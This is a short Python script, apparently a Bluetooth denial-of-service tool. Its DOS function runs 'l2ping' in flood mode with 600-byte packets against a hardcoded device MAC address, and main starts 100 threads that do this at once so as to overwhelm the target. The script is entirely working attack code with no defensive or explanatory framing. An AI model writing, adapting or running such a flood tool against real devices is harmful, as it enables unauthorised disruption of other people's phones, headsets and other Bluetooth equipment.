import os
import threading
import time

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def main():
    time.sleep(0.1)
    target_addr = "08:49:74:24:E5:D2"

    packages_size = 600
    threads_count = 100

    for i in range(0, threads_count):
        threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

    print('[*] Built all threads...')
    print('[*] Starting...')
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
